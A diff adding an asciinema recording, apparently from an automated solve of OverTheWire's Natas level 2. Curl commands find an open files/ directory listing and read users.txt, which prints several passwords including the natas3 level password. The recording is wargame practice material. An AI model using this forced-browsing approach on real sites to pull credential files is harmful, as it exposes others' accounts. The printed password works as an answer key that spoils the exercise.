@@ -1,0 +1,8 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793468698,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L2.sh","title":"Natas L2: open files dir, users.txt","env":{"SHELL":"/bin/bash"}}
+[0.009, "o", "$ curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/ | grep img\r\r\n"]
+[1.049, "o", "<img src=\"files/pixel.png\">\r\r\n"]
+[0.000, "o", "$ curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/    # directory listing is open\r\r\n"]
+[1.005, "o", "href=\"?C=N;O=D\"\r\r\nhref=\"?C=M;O=A\"\r\r\nhref=\"?C=S;O=A\"\r\r\nhref=\"?C=D;O=A\"\r\r\nhref=\"/\"\r\r\nhref=\"pixel.png\"\r\r\nhref=\"users.txt\"\r\r\n"]
+[0.001, "o", "$ curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/users.txt\r\r\n"]
+[0.406, "o", "# username:password\r\r\nalice:BYNdCesZqW\r\r\nbob:jw2ueICLvT\r\r\ncharlie:G5vCxkVV3m\r\r\nnatas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI\r\r\neve:zo4mJWyNj2\r\r\nmallory:9urtcpzBmH\r\r\n"]
+[0.003, "x", "0"]
